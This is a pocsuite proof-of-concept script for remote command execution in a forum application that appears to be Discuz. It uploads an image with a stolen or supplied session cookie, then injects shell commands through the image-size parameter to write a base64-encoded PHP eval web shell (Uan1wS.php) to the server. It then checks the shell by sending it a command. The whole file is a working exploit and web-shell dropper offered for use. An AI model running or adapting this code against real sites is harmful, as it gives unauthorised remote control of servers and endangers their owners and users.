#!/usr/bin/env python
# coding: utf-8
import re
import base64
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


image_data = (
    '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcK'
    'DcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj'
    'IyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAFtAAYDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQo'
    'L/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJico'
    'KSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKzt'
    'LW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAw'
    'QFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOE'
    'l8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOk'
    'paanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiig'
    'AooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACi'
    'iigAooooAKKKKACiiigAooooA//9k='
)

class TestPOC(POCBase):
    vulID = '912'  # vul ID
    version = '1'
    author = ['lowkey']
    vulDate = '2015-01-07'
    createDate = '2015-01-07'
    updateDate = '2015-01-07'
    references = ['http://www.google.com']
    name = 'RCE'
    appPowerLink = 'http://www.google.com'
    appName = '1'
    appVersion = '1'
    vulType = 'Command Execution'
    desc = '''
    '''

    samples = ['']

    def upload_image(self):
        sess = req.Session()
        sess.headers.update(self.headers)
        resp = sess.get('%s/forum.php?mod=post&action=newthread&fid=2' % self.url).content
        
        #get the hash value
        hash_value = re.search('name="hash" value="(?P<hash>[\w\d]{32})"', resp).group('hash')
        upload_url = '%s/misc.php?mod=swfupload&action=swfupload&operation=upload&fid=2' % self.url

        data = {
            'type': 'image',
            'filetype': '.jpg',
            'Filename': 'avatar.jpg',
            'uid': self.params.username,
            'hash': hash_value,
            'Upload': 'Submit Query',
        }
        files = {
            'Filedata': ('avatar.jpg', base64.b64decode(image_data)),
        }
        
        #post to upload file , may need cookies too

        resp = sess.post(upload_url, files=files, data=data).content
        params = {
            'mod': 'ajax',
            'action': 'imagelist',
            'type': 'single',
            'aids': resp,
            'fid': 2,
            'inajax': 1,
            'ajaxtarget': 'image_td_%s' % resp
        }
        resp = sess.get('%s/forum.php' % self.url, params=params).content

        #get the image url
        img_url = re.search('<img src="(.*)" id="image_', resp).group(1)
        return '%s/%s' % (self.url, img_url)

    def _attack(self):
        result = {}

        #need Cookie and username and uid
        if not 'Cookie' in self.headers:
            raise Exception('Cookie required')
        if not 'username' in self.params:
            raise Exception('uid required')

        img_url = self.upload_image()
        payload = '300x300||echo%20PD9waHAgZXZhbCgkX1BPU1RbZV0pOz8%2b|base64%20-d%20%3E%20Uan1wS.php%20%23'

        sess = req.Session()
        sess.headers.update(self.headers)
        sess.get(img_url.replace('300x300', payload))

        #get shell
        resp = req.post('%s/Uan1wS.php' % self.url, data={'e': 'echo strrev(dfgniqsfc);'}).content
        if 'cfsqingfd' in resp:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = '%s/Uan1wS.php' % self.url
            result['ShellInfo']['Content'] = 'e'

        return self.parse_attack(result)

    def _verify(self):
        return self._attack()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
